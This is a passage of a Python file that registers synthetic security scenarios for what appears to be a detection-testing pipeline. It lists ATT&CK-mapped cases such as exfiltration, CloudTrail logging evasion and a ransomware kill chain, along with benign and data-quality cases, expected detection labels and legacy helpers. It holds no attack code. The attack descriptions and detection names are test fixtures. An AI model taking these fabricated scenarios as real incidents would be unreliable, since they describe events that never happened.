        description="Firewall logs detect outbound TLS connection to suspicious destination triggering threat signature alert 9052.",
        generator_fn=scenario_c2_beaconing
    ),
    ScenarioDefinition(
        scenario_id="SCN-NW-02",
        name="Internal Network Subnet Port Reconnaissance",
        category="network",
        classification="malicious",
        severity="medium",
        mitre_attack={"tactic": "Discovery", "technique_id": "T1046", "technique_name": "Network Service Discovery"},
        required_sources=["Firewall logs"],
        expected_detections=["PORT_SCAN_INTERNAL", "INTERZONE_POLICY_DENIALS"],
        description="Internal workstation sweeps other hosts across administration ports (SMB 445, RDP 3389).",
        generator_fn=scenario_port_scan
    ),
    ScenarioDefinition(
        scenario_id="SCN-NW-03",
        name="Large Data Exfiltration over Outbound HTTPS",
        category="network",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Exfiltration", "technique_id": "T1048.003", "technique_name": "Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol"},
        required_sources=["Firewall logs"],
        expected_detections=["DATA_EXFILTRATION_BURST", "ANOMALOUS_BYTES_OUT"],
        description="Outbound transfer volume of 88MB+ to external untrusted destination outside baseline.",
        generator_fn=scenario_data_exfiltration
    ),

    # 4. Cloud (3)
    ScenarioDefinition(
        scenario_id="SCN-CL-01",
        name="IAM Administrator Privilege Escalation",
        category="cloud",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Privilege Escalation", "technique_id": "T1098", "technique_name": "Account Manipulation"},
        required_sources=["AWS CloudTrail"],
        expected_detections=["AWS_IAM_ADMIN_ATTACHED"],
        description="AttachUserPolicy API attaches AdministratorAccess policy to targeted user account from external IP.",
        generator_fn=scenario_iam_privilege_escalation
    ),
    ScenarioDefinition(
        scenario_id="SCN-CL-02",
        name="Security Audit Logging Evasion (StopLogging)",
        category="cloud",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Defense Evasion", "technique_id": "T1562.008", "technique_name": "Disable Cloud Logs"},
        required_sources=["AWS CloudTrail"],
        expected_detections=["CLOUDTRAIL_STOP_LOGGING"],
        description="Defense evasion attempt calling StopLogging on active CloudTrail audit trail.",
        generator_fn=scenario_logging_evasion
    ),
    ScenarioDefinition(
        scenario_id="SCN-CL-03",
        name="Mass S3 Bucket Sensitive Data Exfiltration",
        category="cloud",
        classification="malicious",
        severity="high",
        mitre_attack={"tactic": "Exfiltration", "technique_id": "T1530", "technique_name": "Data from Cloud Storage Object"},
        required_sources=["AWS CloudTrail"],
        expected_detections=["S3_MASS_GETOBJECT", "CONFIDENTIAL_BUCKET_ACCESS"],
        description="Successive GetObject API calls downloading customer identity documents and financial records.",
        generator_fn=scenario_s3_data_exfiltration
    ),

    # 5. Multi-Stage Chains (2)
    ScenarioDefinition(
        scenario_id="SCN-CH-01",
        name="Attack Chain A: Phishing to Cloud Data Compromise",
        category="attack_chain",
        classification="malicious",
        severity="critical",
        mitre_attack={"tactic": "Initial Access", "technique_id": "T1566", "technique_name": "Phishing"},
        required_sources=["Microsoft Entra ID", "Windows Event Logs", "Microsoft Defender", "Firewall logs", "AWS CloudTrail"],
        expected_detections=["MULTI_STAGE_KILLCHAIN", "END_TO_END_COMPROMISE"],
        description="Complete killchain: Entra ID spray -> Windows logon -> PowerShell execution -> Defender alert -> C2 beacon -> Cloud IAM escalation.",
        generator_fn=scenario_attack_chain_a
    ),
    ScenarioDefinition(
        scenario_id="SCN-CH-02",
        name="Attack Chain B: Ransomware Lateral Spread",
        category="attack_chain",
        classification="malicious",
        severity="critical",
        mitre_attack={"tactic": "Lateral Movement", "technique_id": "T1021", "technique_name": "Remote Services"},
        required_sources=["Microsoft Defender", "Windows Event Logs"],
        expected_detections=["LATERAL_MOVEMENT_RDP", "RANSOMWARE_SPREAD"],
        description="Compromised workstation dumps LSASS, performs RDP lateral movement to database server, and encrypts production files.",
        generator_fn=scenario_attack_chain_b
    ),

    # 6. Benign Lookalikes / False Positives (2)
    ScenarioDefinition(
        scenario_id="SCN-FP-01",
        name="Authorized IT Administrator Maintenance Window",
        category="benign",
        classification="benign",
        severity="low",
        mitre_attack={"tactic": "Execution", "technique_id": "T1059", "technique_name": "Command Scripting Interpreter"},
        required_sources=["Microsoft Entra ID", "Windows Event Logs"],
        expected_detections=["AUTHORIZED_ADMIN_ACTIVITY"],
        description="Admin Michael Anderson performs scheduled Sunday maintenance under Change Ticket CR-8821.",
        generator_fn=scenario_admin_maintenance
    ),
    ScenarioDefinition(
        scenario_id="SCN-FP-02",
        name="Approved Vulnerability Scanner Sweeping Subnet",
        category="benign",
        classification="benign",
        severity="informational",
        mitre_attack={"tactic": "Discovery", "technique_id": "T1046", "technique_name": "Network Service Discovery"},
        required_sources=["Firewall logs"],
        expected_detections=["APPROVED_VULN_SCANNER"],
        description="Internal scanner IP sweeps subnet with documented schedule; policy allows traffic without incident escalation.",
        generator_fn=scenario_vuln_scanner
    ),

    # 7. Data Quality & Edge Cases (2)
    ScenarioDefinition(
        scenario_id="SCN-DQ-01",
        name="Duplicate Telemetry Record Ingestion",
        category="data_quality",
        classification="data_quality",
        severity="informational",
        mitre_attack={"tactic": "Data Quality", "technique_id": "DQ-01", "technique_name": "Duplicate Telemetry"},
        required_sources=["Microsoft Defender", "Microsoft Entra ID"],
        expected_detections=["EVENT_DEDUPLICATION_TRIGGERED"],
        description="Emits exact duplicate Defender and Entra ID records with identical natural keys to test deduplication.",
        generator_fn=scenario_duplicate_telemetry
    ),
    ScenarioDefinition(
        scenario_id="SCN-DQ-02",
        name="Delayed and Out-of-Order Telemetry Arrival",
        category="data_quality",
        classification="data_quality",
        severity="informational",
        mitre_attack={"tactic": "Data Quality", "technique_id": "DQ-02", "technique_name": "Late-Arriving Events"},
        required_sources=["Windows Event Logs", "Firewall logs"],
        expected_detections=["OUT_OF_ORDER_PROCESSED"],
        description="Emits events with reversed timestamps and delayed arrival (4 minutes in the past) to test time-window correlation.",
        generator_fn=scenario_out_of_order_telemetry
    )
]

# Register all 20 into the registry singleton
for s_def in SCENARIOS_DEFINITIONS:
    scenario_registry.register(s_def)

# Legacy helper with strict lookup
def get_scenario_by_id(scenario_id: str) -> List[Tuple[Dict[str, Any], str]]:
    """
    Retrieves events for scenario by ID with strict lookup.
    """
    # Legacy aliases
    sid_map = {
        "SCN-001": "SCN-CH-01",
        "SCN-TARGETED-001": "SCN-CH-01",
        "SCN-002": "SCN-FP-01",
        "SCN-BENIGN-002": "SCN-FP-01",
        "SCN-003": "SCN-DQ-01",
        "SCN-DUPLICATES-003": "SCN-DQ-01",
        "SCN-004": "SCN-NW-02",
        "SCN-INCONCLUSIVE-004": "SCN-NW-02"
    }
    resolved_id = sid_map.get(scenario_id.upper().strip(), scenario_id.upper().strip())
    return scenario_registry.execute_scenario(resolved_id)

def build_targeted_attack_scenario() -> List[Tuple[Dict[str, Any], str]]:
    return get_scenario_by_id("SCN-001")

def build_benign_baseline_scenario() -> List[Tuple[Dict[str, Any], str]]:
    return get_scenario_by_id("SCN-002")

def build_duplicates_scenario() -> List[Tuple[Dict[str, Any], str]]:
    return get_scenario_by_id("SCN-003")

def build_inconclusive_scenario() -> List[Tuple[Dict[str, Any], str]]:
    return get_scenario_by_id("SCN-004")
